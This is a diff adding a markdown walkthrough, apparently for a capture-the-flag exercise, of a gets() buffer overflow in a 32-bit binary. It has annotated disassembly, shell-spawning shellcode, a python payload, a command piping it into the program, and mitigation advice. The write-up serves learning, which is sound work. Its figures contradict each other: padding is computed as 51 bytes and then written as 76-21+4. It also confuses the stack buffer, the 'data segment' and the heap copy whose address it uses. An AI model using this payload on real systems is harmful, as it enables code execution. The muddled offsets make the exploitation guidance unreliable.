@@ -1,0 +1,355 @@
+# Exploiting a Buffer Overflow Vulnerability in a C Program
+
+There is no apparent exploit on embeded on the source code, this means that the exploit must be developed by the atackers, such as a shell script.
+Now all we must find is a vulnerability
+
+Here, there is a variable in the **data segment**, and the `gets()` function is used to read input into it without bounds checking. This creates a classic buffer overflow vulnerability.
+
+## Vulnerability Overview
+
+The vulnerability lies in the following:
+1. **Unsafe Use of `gets()`**:
+   - `gets()` does not perform bounds checking, meaning a user can input more data than `buf` can hold, causing an overflow.
+
+2. **Return Address Check**:
+   - The program checks whether the return address is within the expected range:
+     ```c
+     if ((__return_addr & 0xb0000000) != 0xb0000000)
+     ```
+     - This is intended to detect and prevent stack-based buffer overflows, but it does not cover cases where the return address points to executable regions like the **data segment** or **heap**.
+
+3. **Shellcode Injection**:
+   - By overflowing the ds `var`, an attacker can overwrite the return address with a pointer to a shellcode injected into the buffer, achieving arbitrary code execution.
+
+---
+
+<details>
+<summary><h3>Assembly decomposition</h3></summary>
+
+***
+
+```
+0x080484d4 <+0>:	push   ebp
+0x080484d5 <+1>:	mov    ebp,esp
+```
+
+> Setup the stack frame
+
+***
+
+```
+0x080484d7 <+3>:	sub    esp,0x68
+```
+
+> Reserve space for the function local variables
+>
+> 104 bytes (0x68 in hexadecimal)
+
+***
+
+```
+0x080484da <+6>:	mov    eax,ds:0x8049860
+```
+
+> The value at memory location 0x8049860 is loaded into the eax register.
+>
+> What’s in 0x8049860? A global variable.
+>
+> `ds` stands for data segment. The data segment is the place in RAM that a program stores its global and static data.
+
+***
+
+```
+0x080484df <+11>:	mov    DWORD PTR [esp],eax
+```
+
+> esp -> stack pointer [esp] memory address of stack pointer (literaly the stack address)
+>
+> The value in eax is placed on the stack.
+>
+> This is how arguments are passed to a function being called (in this case, fflush, see next call).
+
+***
+
+```
+0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
+```
+
+> The CPU jumps to the fflush function (a standard library function used to flush buffered output).
+>
+> To ensure all output (like from printf) is displayed immediately.
+
+***
+
+```
+0x080484e7 <+19>:	lea    eax,[ebp-0x4c]
+```
+
+> ebp -> base pointer, ebp - 0x4c = ebp - 76 
+> Loads the memory address of ebp - 0x4c into the eax register.
+>
+> [ebp-0x4c]: A location on the stack reserved for storing input.
+
+***
+
+```
+0x080484ea <+22>:	mov    DWORD PTR [esp],eax
+```
+
+> Places the address stored in eax onto the stack.
+> Preparing the argument for the gets function.
+
+***
+
+```
+0x080484ed <+25>:	call   0x80483c0 <gets@plt>
+```
+
+> Jumps to the gets function, which reads a line of input from the user and stores it at the address passed (in this case, [ebp-0x4c]).
+>
+> This means we have 76 bytes of "valid" reserved memory (we set this up with the lea operation before).
+>
+> Warning! The gets function is unsafe because it doesn’t limit the size of input, which can lead to buffer overflows (after 0x4c)
+
+***
+
+```
+0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]
+```
+
+> ebp -> base pointer, [ebp + 0x4] memory address on base pointer + 4 bytes
+>
+> Loads the value at [ebp+0x4] into eax.
+
+***
+
+```
+0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax
+```
+
+> ebp -> base pointer, [ebp - 0xc] = [ebp - 12]
+>
+> Stores the value in eax into [ebp-0xc], a local variable on the stack.
+
+***
+
+```
+0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]
+```
+
+> Loads the value at [ebp-0xc] (the local variable) into eax.
+
+***
+
+```
+0x080484fb <+39>:	and    eax,0xb0000000
+```
+
+> Performs a bitwise AND operation between eax and 0xb0000000.
+
+***
+
+```
+0x08048500 <+44>:	cmp    eax,0xb0000000
+```
+
+> Compares eax with 0xb0000000.
+
+***
+
+```
+0x08048505 <+49>:	jne    0x8048527 <p+83>
+```
+
+> If the values compared in the previous instruction are not equal (jump if not equal), the CPU skips to address 0x8048527
+
+***
+
+#### The values are equal
+
+```
+0x08048507 <+51>:	mov    eax,0x8048620
+```
+
+> Loads the address 0x8048620 into the eax register.
+>
+> 0x8048620 is likely a string constant (message stored in the program’s memory).
+
+***
+
+```
+0x0804850c <+56>:	mov    edx,DWORD PTR [ebp-0xc]
+```
+
+> Loads the value of the local variable at [ebp-0xc] into the edx register.
+> 
+> [ebp-0xc] is a local variable that was set earlier in the function.
+
+***
+
+```
+0x0804850f <+59>:	mov    DWORD PTR [esp+0x4],edx
+```
+
+> Places the value in edx (the local variable) at the second argument position on the stack.
+>
+> This is preparing the second argument for the printf function call.
+
+***
+
+```
+0x08048513 <+63>:	mov    DWORD PTR [esp],eax
+```
+
+> Places the value in eax (the error message address) at the first argument position on the stack.
+
+***
+
+```
+0x08048516 <+66>:	call   0x80483a0 <printf@plt>
+```
+
+> Calls the printf function to print the formatted error message.
+
+***
+
+```
+0x0804851b <+71>:	mov    DWORD PTR [esp],0x1
+```
+
+> Places the value 1 on the stack as the argument for the _exit function.
+
+***
+
+```
+0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
+```
+
+> Calls the _exit function to terminate the program immediately.
+
+***
+
+#### The values are NOT equal [Interesting part]
+
+```
+0x08048527 <+83>:	lea    eax,[ebp-0x4c]
+```
+
+> Loads the address of the buffer [ebp-0x4c] (where the input was stored) into the eax register.
+>
+> `lea`: It stands for Load Effective Address and is often used to calculate addresses without loading their contents.
+
+***
+
+```
+0x0804852a <+86>:	mov    DWORD PTR [esp],eax
+```
+
+> Places the memory address in eax (the address of the input string) onto the stack.
+
+***
+
+```
+0x0804852d <+89>:	call   0x80483f0 <puts@plt>
+```
+
+> Calls the puts function, which prints the string passed as its argument.
+>
+> The user’s input, stored at [ebp-0x4c], is printed to the screen.
+
+***
+
+```
+0x08048532 <+94>:	lea    eax,[ebp-0x4c]
+0x08048535 <+97>:	mov    DWORD PTR [esp],eax
+0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
+```
+
+> Again, calculates the memory address of the input string at [ebp-0x4c] and loads it into the eax register.
+>
+> Places the memory address of the input string onto the stack as an argument for the strdup function
+>
+> Calls the strdup function, which duplicates the input string by allocating new memory for it and copying the content into that memory.
+>
+> The duplicated string is stored somewhere in dynamically allocated memory (heap).
+
+***
+
+```
+0x0804853d <+105>:	leave  
+0x0804853e <+106>:	ret    
+```
+
+> Clean up
+
+***
+
+</details>
+
+## Exploitation Details
+
+### Memory Layout
+- The program allocates a `var` in the **data segment**, allowing it to hold a shellcode payload.
+- The program reserves **76 bytes on the stack**, enough space for the buffer overflow to overwrite the saved return address.
+
+### Exploit Steps
+1. **Inject Shellcode**:
+   - Prepare a shellcode payload. In this example, the shellcode spawns a shell and is 21 bytes long:
+     ```assembly
+     "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
+     ```
+
+2. **Fill the Buffer**:
+   - Fill the remaining space (76 bytes in total) with padding to reach the saved return address:
+     - `A` * (76 - shellcode size - 4) = `A` * 51.
+   - The `- 4` accounts for alignment if necessary.
+
+3. **Overwrite the Return Address**:
+   - Overwrite the return address with the address of `buf` in the **data segment**. For example, suppose `buf` is at address `0x0804a008`, we use this address in little-endian format:
+     ```python
+     "\x08\xa0\x04\x08"
+     ```
+   - Find if the address is really 0x0804a008? Use `ltrace` to check it out or gdb with a brakepoint after strdup
+
+4. **Craft the Payload**:
+   - Combine the shellcode, padding, and new return address:
+     ```bash
+     python -c 'print("\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "A" * (76 - 21 + 4) + "\x08\xa0\x04\x08")'
+     ```
+
+5. **Exploit Execution**:
+   - Pipe the crafted payload to the program:
+     ```bash
+     (python -c 'print("\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "A" * (76 - 21 + 4) + "\x08\xa0\x04\x08")'; cat -) | ./level2
+     ```
+
+   - The shellcode is executed, granting a shell.
+
+---
+
+## Mitigation Strategies
+
+1. **Replace `gets()`**:
+   - Replace `gets()` with safer alternatives like `fgets()`, which performs bounds checking.
+
+2. **Stack and Memory Protections**:
+   - Enable stack canaries to detect and prevent buffer overflows.
+   - Use Address Space Layout Randomization (ASLR) to randomize memory layout and make it harder to predict the location of shellcode.
+
+3. **Non-Executable Memory**:
+   - Mark the stack and data segment as non-executable using modern OS protections.
+
+4. **Validate Return Address**:
+   - Strengthen return address validation to prevent redirection to shellcode in the data segment.
+
+---
+
+## Conclusion
+
+This program is vulnerable to a buffer overflow exploit due to the unsafe use of `gets()` and inadequate return address validation. An attacker can inject shellcode into the buffer, overwrite the return address, and execute arbitrary code.
+
+The exploit can be executed as follows:
+1. Inject a 21-byte shellcode.
+2. Pad the buffer to 76 bytes.
+3. Overwrite the return address with the address of the buffer.
+
